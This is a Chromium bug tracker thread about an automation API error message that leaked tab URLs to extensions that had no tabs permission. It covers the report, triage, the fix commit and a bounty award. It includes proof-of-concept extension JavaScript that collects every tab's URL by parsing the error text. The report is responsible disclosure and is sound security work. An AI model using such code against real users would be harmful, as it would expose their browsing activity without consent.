# Automation API leaks tab URLs

| Field | Value |
|-------|-------|
| **Issue ID** | [40085155](https://issues.chromium.org/issues/40085155) |
| **Status** | Assigned |
| **Severity** | S4-Minimal |
| **Priority** | P2 |
| **Component** | UI>Accessibility |
| **Platforms** | Android, Fuchsia, Linux, Mac, Windows, ChromeOS |
| **Reporter** | ja...@googlemail.com |
| **Assignee** | mo...@google.com |
| **Created** | 2016-08-19 |
| **Bounty** | $500.00 |

## Description

UserAgent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36

Steps to reproduce the problem:
1. Open a dev build; the Automation API is not present in stable.
2. Open a few tabs with secret URLs.
3. Unpack and load the attached extension.
4. Wait a few seconds for the alert().
5. Verify that the extension didn't request any permissions that are visible in the UI.

Here's a copy of the background.js in the attached extension:

var urls = [];
var i = 0;
function next_() {
  if (i == 10000) {
    alert(urls.join('\n'));
    return;
  }
  chrome.automation.getTree(i, function() {
    var msg = chrome.runtime.lastError.message;
    if (msg.indexOf('automation tree on url "') !== -1) {
      urls.push(msg.split('"')[1]);
    }
    i++;
    next_();
  });
}
next_();

What is the expected behavior?

What went wrong?
You'll see an alert() window with the URLs of all tabs. The problem is that the error message for permission denial (kCannotRequestAutomationOnPage) contains the URL of the specified tab, which is normally only revealed to an extension with the "tabs" permission.

Did this work before? N/A 

Chrome version: 54.0.2824.0  Channel: dev
OS Version: 
Flash Version: 22.0.0.209

In case this qualifies for a reward: I'm not sure whether I'm eligible to receive rewards.

## Attachments

- [urlleak_extension.zip](attachments/urlleak_extension.zip) (application/octet-stream, 886 B)

## Timeline

### ji...@chromium.org (2016-08-19)

Thanks for reporting this issue, jannhorn@! I'll leave it to accessibility team to triage and decide if it is qualified for the reward program. 

+dtseng@, could you help triage this bug since you're the owner of related files?
Thanks!

[Monorail components: UI>Accessibility]

### dt...@chromium.org (2016-08-19)

Hi, thanks for the report and the investigation into this!

This API is in dev because it hasn't received a full security review. Accessibility, by necessity, reveals various pieces of info for programmatic access. You can, for example, get the same result by querying the native platform API's for accessibility.


### ja...@googlemail.com (2016-08-19)

> Accessibility, by necessity, reveals various pieces of info for programmatic access.

But here, the accessibility API explicitly tries to *not* grant any access to that tab because the user hasn't allowed it.

### dt...@chromium.org (2016-08-19)

I'm not ok with granting a reward for a developmental api. 

### sh...@chromium.org (2016-08-20)

[Empty comment from Monorail migration]

### ji...@chromium.org (2016-08-22)

[Empty comment from Monorail migration]

### mb...@chromium.org (2018-07-30)

Though I didn't investigate too closely this no longer seems to reproduce. Can we close this out?

### ja...@googlemail.com (2018-07-31)

> Though I didn't investigate too closely this no longer seems to reproduce.

Because the PoC relies on tab IDs being between 0 and 10000, and apparently that's no longer the case. If you supply a valid tab ID, it still works. I didn't design my PoC to be sufficiently robust to withstand the random changes made over ~2 years. :P

Code (run it in devtools in the context of an extension with automation API access):

chrome.windows.getAll({populate:true}, (windows) => {
  let tabs = [].concat.apply([], windows.map(x=>x.tabs.map(x=>x.id)));
  let urls = [];
  let i = 0;
  function next_() {
    if (i == tabs.length) {
      console.log(urls.join('\n'));
      return;
    }
    chrome.automation.getTree(tabs[i], function() {
      var msg = chrome.runtime.lastError.message;
      if (msg.indexOf('automation tree on url "') !== -1) {
        urls.push(msg.split('"')[1]);
      }
      i++;
      next_();
    });
  }
  next_();
});

Output:
https://www.google.ch/search?q=how+to+make+waffles&rlz=1CAZZAF_enCH806&oq=how+to+make+waffles&aqs=chrome..69i57j0l5.15038j0j7&sourceid=chrome&ie=UTF-8
https://www.google.ch/search?q=pancake+recipe&rlz=1CAZZAF_enCH806&oq=pancake+recipe&aqs=chrome..69i57j0l5.2555j0j7&sourceid=chrome&ie=UTF-8

> Can we close this out?

No.

### dt...@chromium.org (2018-07-31)

#4 still applies. I'll defer to security folks on this one...but I'd vote to close.

### ja...@googlemail.com (2018-08-01)

Re #4: I'm not interested in a reward for this. However, I do think that it's worth pointing out that https://www.google.com/about/appsecurity/chrome-rewards/ states that "We are interested in bugs that make it to our Stable, Beta and Dev channels", without any qualifier that excludes specific APIs.

Also: I have just verified that I can upload a Chrome extension with permission to use the automation API into the Chrome Web Store, and then install it from there on a Dev build, and then use the automation API from the context of the webstore-installed extension. I understand that Dev builds are generally expected to be more buggy than Stable and Beta, but I didn't realize that security bugs that only affect users of Dev builds are apparently considered to not be worth fixing.

### js...@chromium.org (2018-08-28)

[Empty comment from Monorail migration]

### rd...@chromium.org (2018-08-28)

Extensions that use the automation API can basically do *anything*, I think - it's one of the most powerful APIs there (right up there with debugger).  Right now, it's restricted to ChromeVox on stable channel, and is usable by any extension on dev channel.

I think we should just remove dev channel support (except for Chromevox).

dtseng, dmazzoni, aboxhall - do you know why we allowed any extension to use this on dev channel?  Any concerns with removing the capability?

### ct...@chromium.org (2019-01-25)

Sheriff here: To follow up on this, c#10 is correct that security bugs in Dev channel are still security bugs. The impact should still be Impact-Head, as this is currently accessible on Dev channel in the wild (per c#12).

Separately, we could potentially say that this is WAI if that is the argument being made here, but the risk posed by this from arbitrary extensions is high.

Per c#12, assigning this to dtseng@ to determine the next steps (on whether this is necessary to be exposed to Dev channel). Thanks.


### sh...@chromium.org (2019-01-26)

dtseng: Uh oh! This issue still open and hasn't been updated in the last 178 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-01-26)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### sh...@chromium.org (2019-01-30)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-02-09)

dtseng: Uh oh! This issue still open and hasn't been updated in the last 192 days. This is a serious vulnerability, and we want to ensure that there's progress. Could you please leave an update with the current status and any potential blockers?

If you're not the right owner for this issue, could you please remove yourself as soon as possible or help us find the right one?

If the issue is fixed or you can't reproduce it, please close the bug. If you've started working on a fix, please set the status to Started.

Thanks for your time! To disable nags, add the Disable-Nags label.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ab...@google.com (2019-02-20)

+awhalley@ is there any action needed here?

### ja...@googlemail.com (2019-02-20)

(By the way, as context: Unlike e.g. the debugger API, an extension's use of the accessibility API is not displayed in the list of permissions at <chrome://extensions/?id=...>.)

### aw...@google.com (2019-02-21)

Yep, we should disable dev channel support (except for Chromevox), but no need for it to release block 73


### sh...@chromium.org (2019-02-21)

This is a serious security regression. If you are not able to fix this quickly, please revert the change that introduced it.

If this doesn't affect a release branch, or has not been properly classified for severity, please update the Security_Impact or Security_Severity labels, and remove the ReleaseBlock label. To disable this altogether, apply ReleaseBlock-NA.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### dt...@chromium.org (2019-02-21)

This bug has been open for a *loong* time. The original issue parses logging from an error...let's remove that logging and clear this bug out once and for all. If that is satisfactory :).

### dt...@chromium.org (2019-02-21)

Also, @devlin's comments, I think there should be a larger discussion because extensions using the automation api can't just do anything.  Would be good to clarify what is meant.

In another sense, extensions can do just as much more or less using a content script.



### rd...@chromium.org (2019-02-21)

> Also, @devlin's comments, I think there should be a larger discussion because extensions using the automation api can't just do anything.  Would be good to clarify what is meant.

My recollection was that the automation API allowed the effectively the same type of capabilities as a content script, but didn't have the same restrictions on sites that content scripts do.  I thought automation also allowed extensions to manipulate e.g. chrome://settings pages, etc (which is important for ChromeVox).  I vaguely thought there might be some other contexts it can affect as well (Chrome Apps?  More native UI?  Maybe not...), but not sure that's right.

If that's incorrect and there are the same restricted URL checks for the automation API, then I'm less worried about this bug.

All that being said, can we just remove the ability for arbitrary extensions to use this on dev channel?  dtseng@, if there's no concerns there, I can throw together a CL to do so.

### rd...@chromium.org (2019-02-21)

[Empty comment from Monorail migration]

### dt...@chromium.org (2019-02-21)

Automation is actually far more restrictive:- we allow only page level access and use the same matches url patterns within the extension manifest.
The exception is what we call "desktop" permissions, which is used by ChromeVox and other screen readers.
- automation builds its tree over the accessibility tree which is in large part read-only.
A content script can manipulate the DOM in whatever way it wants. This is a pretty significant difference I think.

Let's sync up offline for the dev channel behavior.

### bu...@chops-service-accounts.iam.gserviceaccount.com (2019-02-28)

The following revision refers to this bug:
  https://chromium.googlesource.com/chromium/src.git/+/8bf91a6612ead0791f332ff2e042883f03e924b5

commit 8bf91a6612ead0791f332ff2e042883f03e924b5
Author: David Tseng <dtseng@chromium.org>
Date: Thu Feb 28 01:50:15 2019

Remove logging that exposes url in error output

Bug: 639322
Change-Id: I9443dab4aeaeef75e722bba8d3835f00406a3c65
Reviewed-on: https://chromium-review.googlesource.com/c/1481570
Commit-Queue: David Tseng <dtseng@chromium.org>
Reviewed-by: Devlin <rdevlin.cronin@chromium.org>
Cr-Commit-Position: refs/heads/master@{#636253}
[modify] https://crrev.com/8bf91a6612ead0791f332ff2e042883f03e924b5/chrome/browser/extensions/api/automation_internal/automation_internal_api.cc
[modify] https://crrev.com/8bf91a6612ead0791f332ff2e042883f03e924b5/chrome/test/data/extensions/api_test/active_tab/background.js
[modify] https://crrev.com/8bf91a6612ead0791f332ff2e042883f03e924b5/chrome/test/data/extensions/api_test/automation/tests/tabs_automation_boolean/permissions.js
[modify] https://crrev.com/8bf91a6612ead0791f332ff2e042883f03e924b5/chrome/test/data/extensions/api_test/automation/tests/tabs_automation_hosts/permissions.js


### go...@chromium.org (2019-03-13)

Reminder M74 is ALREADY branched and going to Beta next week. Please review this bug and assess if this is indeed a RBS. If not, please remove the RBS label. If so, please make sure to land the fix & request a merge to M74 ASAP, so the change gets enough beta coverage. Thank you.

### aw...@google.com (2019-03-17)

[Empty comment from Monorail migration]

### mm...@chromium.org (2019-04-26)

dtseng@, please provide a status update on this issue when you get a chance. Security team would greatly appreciate that. Thanks!

### mm...@chromium.org (2019-04-29)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-06-06)

[Empty comment from Monorail migration]

### me...@chromium.org (2019-06-13)

Pinged dtseng@ offline.

### va...@chromium.org (2019-07-09)

Pinged dtseng@ offline again.

### sh...@chromium.org (2019-07-31)

[Empty comment from Monorail migration]

### jd...@chromium.org (2019-08-19)

Hi dtseng@ et al. Any progress on this? Chrome Security would still love to see some momentum here.

Thanks!
A friendly security marshal

### sh...@chromium.org (2019-09-11)

[Empty comment from Monorail migration]

### sh...@chromium.org (2019-10-23)

[Empty comment from Monorail migration]

### aj...@google.com (2019-11-27)

Hi dtseng@ - Is this still a valid bug?

### sh...@chromium.org (2019-12-11)

[Empty comment from Monorail migration]

### me...@chromium.org (2020-01-07)

This seems fixed, but dtseng is OOO until next week. Can anyone familiar with the bug take a look and see if we can consider it as fixed? Thanks!

### do...@chromium.org (2020-01-23)

Another re-up from the security marshall. Can we please have an update on whether this issue is addressed?

### me...@chromium.org (2020-01-31)

David, friendly ping for an update. Thanks!

### dt...@chromium.org (2020-01-31)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-01-31)

[Empty comment from Monorail migration]

### na...@google.com (2020-02-03)

[Empty comment from Monorail migration]

### sh...@chromium.org (2020-02-03)

Not requesting merge to beta (M80) because latest trunk commit (636253) appears to be prior to beta branch point (722274). If this is incorrect, please replace the Merge-na label with Merge-Request-80. If other changes are required to fix this bug completely, please request a merge if necessary.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2020-02-03)

The commit here was released in 74.0.3729.108.

jannhorn@ we apologize for the long time to adjust the bug status here and send it to the VRP panel. In due course I will go back and update the M74 release notes and allocate a CVE.

### na...@google.com (2020-02-05)

*** Boilerplate reminders! ***
Please do NOT publicly disclose details until a fix has been released to all our users. Early public disclosure may cancel the provisional reward. Also, please be considerate about disclosure when the bug affects a core library that may be used by other products. Please do NOT share this information with third parties who are not directly involved in fixing the bug. Doing so may cancel the provisional reward. Please be honest if you have already disclosed anything publicly or to third parties. Lastly, we understand that some of you are not interested in money. We offer the option to donate your reward to an eligible charity. If you prefer this option, let us know and we will also match your donation - subject to our discretion. Any rewards that are unclaimed after 12 months will be donated to a charity of our choosing.

Please contact security-vrp@chromium.org with any questions.
******************************

### pa...@chromium.org (2020-02-06)

Congrats the Panel decided to award $500 for this report! 

### na...@google.com (2020-02-06)

[Empty comment from Monorail migration]

### [Deleted User] (2020-05-09)

This bug has been closed for more than 14 weeks. Removing security view restrictions.

For more details visit https://www.chromium.org/issue-tracking/autotriage - Your friendly Sheriffbot

### ad...@google.com (2020-06-01)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-06-03)

[Empty comment from Monorail migration]

### ad...@chromium.org (2020-06-03)

[Empty comment from Monorail migration]

### ad...@google.com (2020-09-03)

[Empty comment from Monorail migration]

### ad...@google.com (2021-01-08)

[Empty comment from Monorail migration]

### cs...@google.com (2021-10-15)

No crashes have been reported and the code is presumed fixed.

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### ha...@google.com (2024-01-08)

[Empty comment from Monorail migration]

### is...@google.com (2024-01-08)

This issue was migrated from crbug.com/chromium/639322?no_tracker_redirect=1

[Monorail components added to Component Tags custom field.]

---
*Data from [Chromium Issue Tracker](https://issues.chromium.org/issues/40085155)*
